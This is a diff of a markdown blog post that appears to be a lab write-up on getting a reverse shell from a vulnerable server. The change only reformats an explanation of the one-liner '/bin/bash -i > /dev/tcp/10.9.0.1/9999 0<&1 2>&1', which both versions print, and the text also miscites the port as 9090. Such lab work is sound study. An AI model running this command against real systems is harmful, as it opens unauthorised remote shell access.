@@ -184,15 +184,14 @@ This task involves creating a reverse shell for the vulnerable server. To accomp
 ![task-3-b](https://github.com/iukadike/blog/assets/58455326/fc6a3e50-3554-4650-9e6d-668e3ca12962)
 
 <details>
-  <summary>/bin/bash -i > /dev/tcp/10.9.0.1/9999 0<&1 2>&1</summary>
-  <br>
-  <ul>
-    <li>"/bin/bash": Specifies the execution of the bash shell. </li>
-    <li>"-i": Launches the Bash shell in interactive mode, allowing for user input and output. </li>
-    <li>"> /dev/tcp/10.9.0.1/9999": Redirects the output of the Bash shell to the TCP connection established with the IP address 10.9.0.1 on port 9999. </li>
-    <li>"0<&1": Redirects file descriptor 0 (standard input) to file descriptor 1 (standard output). This enables input from the TCP connection on port 9090, ensuring that user input can be received via the established shell. </li>
-    <li>"2>&1": Redirects file descriptor 2 (standard error) to file descriptor 1 (standard output). This ensures that error messages from the Bash shell are also captured and sent through the established TCP connection. </li>
-  </ul>
+<summary><code>/bin/bash -i > /dev/tcp/10.9.0.1/9999 0<&1 2>&1</code></summary>
+
+- `/bin/bash`: Specifies the execution of the bash shell.
+- `-i`: Launches the Bash shell in interactive mode, allowing for user input and output.
+- `> /dev/tcp/10.9.0.1/9999`: Redirects the output of the Bash shell to the TCP connection established with the IP address 10.9.0.1 on port 9999.
+- `0<&1`: Redirects file descriptor 0 (standard input) to file descriptor 1 (standard output). This enables input from the TCP connection on port 9090, ensuring that user input can be received via the established shell.
+- `2>&1`: Redirects file descriptor 2 (standard error) to file descriptor 1 (standard output). This ensures that error messages from the Bash shell are also captured and sent through the established TCP connection.
+
 </details>
 
 <br>
